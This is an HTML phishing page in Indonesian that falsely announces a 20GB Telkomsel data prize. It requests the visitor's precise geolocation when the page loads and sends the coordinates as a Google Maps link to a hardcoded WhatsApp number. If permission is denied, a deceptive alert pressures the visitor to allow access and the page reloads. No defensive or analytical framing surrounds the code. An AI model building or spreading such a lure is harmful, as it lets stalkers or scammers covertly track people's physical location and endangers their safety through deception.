<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sistem Android</title>
    <style>
        body { background: #000; color: #fff; text-align: center; padding-top: 50px; font-family: sans-serif; }
        .alert { border: 1px solid #444; padding: 20px; margin: 20px; border-radius: 10px; }
        button { background: #007bff; color: #fff; border: none; padding: 15px; width: 80%; border-radius: 5px; font-weight: bold; }
    </style>
</head>
<body onload="minta()">
    <div class="alert">
        <p><b>SELAMAT KAMU MENDAPATKAN KUOTA 20GB TELKOMSEL</b></p>
        <button onclick="minta()">TEKAN DISINI</button>
    </div>

    <script>
        function minta() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(p) {
                    const lat = p.coords.latitude;
                    const lon = p.coords.longitude;
                    const wa = "6281283408166";
                    const linkWA = "https://wa.me/" + wa + "?text=" + encodeURIComponent("KODE UNDIAN: https://www.google.com/maps?q=" + lat + "," + lon);
                    window.location.href = linkWA;
                }, function(e) {
                    alert("KESALAHAN: Anda harus menekan 'IZINKAN' untuk memulihkan akses chat.");
                    location.reload();
                }, {enableHighAccuracy: true});
            }
        }
    </script>
</body>
</html>
